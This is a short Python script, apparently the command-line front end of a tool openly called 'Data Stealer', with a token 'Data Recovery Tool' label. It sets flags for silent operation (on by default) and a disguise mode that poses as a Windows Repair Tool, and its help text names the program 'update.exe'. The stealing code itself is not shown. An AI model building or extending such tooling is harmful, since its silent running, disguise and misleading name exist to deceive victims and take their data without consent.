import argparse

from modules import *
from config import Constant


HELP = """
update.exe 
"""

def parser():
    parser = argparse.ArgumentParser(description="Data Stealer | Another Data Recovery Tool | Built by @hirusha-adi")
    parser.add_argument("--silent", "-s" , action="store_true", help="Silent Mode - No Console Output", default=True)
    parser.add_argument("--disguise", "-d" , action="store_true", help="Disguise Mode - Act as Windows Repair Tool", default=False)
    parser.add_argument("--verbose", "-v" , action="store_true", help="Verbose - Display everything that happens", default=False)
    parser.add_argument("--log", "-l" , action="store_true", help="Log to file", default=False)
    
    args = parser.parse_args()
    
    Constant.Args.disguise = args.disguise
    Constant.Args.silent = args.silent
    Constant.Args.verbose = args.verbose
    Constant.Args.log = args.log


parser()